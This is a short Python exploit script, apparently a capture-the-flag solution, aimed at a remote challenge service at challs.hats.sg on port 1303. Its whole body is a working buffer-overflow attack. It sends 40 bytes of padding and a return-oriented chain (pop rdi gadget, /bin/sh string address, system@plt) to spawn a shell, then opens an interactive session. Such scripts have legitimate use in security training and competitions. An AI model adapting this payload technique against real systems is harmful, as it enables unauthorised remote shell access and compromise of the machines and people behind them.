#!/usr/bin/env python3
import socket
import telnetlib
import struct

def p64(x):
    return struct.pack('<Q', x)

# Connect to program
s = socket.socket()
s.connect(('challs.hats.sg', 1303))

t = telnetlib.Telnet()
t.sock = s

# Send payload
addr_pop_rdi = 0x4012bb
addr_bin_sh  = 0x4020A0
addr_system_plt = 0x401040

payload = b'A' * 40
payload += p64(addr_pop_rdi)
payload += p64(addr_bin_sh)
payload += p64(addr_system_plt)

t.write(payload + b'\n')

print(t.read_until(b'try /bin/sh'))

t.interact()
quit()

quit()
